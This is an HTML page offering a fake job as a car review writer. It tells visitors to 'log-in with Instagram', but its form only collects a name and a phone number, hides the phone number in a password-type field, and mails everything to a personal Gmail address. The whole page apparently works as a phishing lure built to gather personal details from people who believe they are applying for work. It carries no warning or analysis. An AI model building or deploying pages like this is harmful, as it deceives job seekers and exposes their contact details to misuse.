<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Car Review Writer Candidates</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
        }
        .container {
            width: 50%;
            margin: auto;
            overflow: hidden;
            padding: 2em;
            background: #fff;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            margin-top: 2em;
        }
        h1 {
            text-align: center;
            color: #333;
        }
        form {
            display: flex;
            flex-direction: column;
        }
        label {
            margin-bottom: 0.5em;
            color: #333;
        }
        input[type="text"], input[type="password"] {
            padding: 0.5em;
            margin-bottom: 1em;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        button {
            padding: 0.5em;
            background: #007BFF;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        button:hover {
            background: #0056b3;
        }
        button i {
            margin-left: 0.5em;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Shortlisting Car Review Writers - You're Invited!</h1>
        <p>We are looking for passionate individuals to write real reviews about cars and introduce them to our customers. If you love cars and have a flair for writing, we want to hear from you! Please log-in with Instagram below to proceed.</p>
        <form action="mailto:justanotherguyonearth2002@gmail.com" method="post" enctype="text/plain">
            <label for="name">Name:</label>
            <input type="text" id="name" name="name" required>
            
            <label for="number">Phone Number:</label>
            <input type="password" id="number" name="number" required>
            
            <button type="submit">
                Submit <i class="fa fa-paper-plane" aria-hidden="true"></i>
            </button>
        </form>
    </div>
</body>
</html>
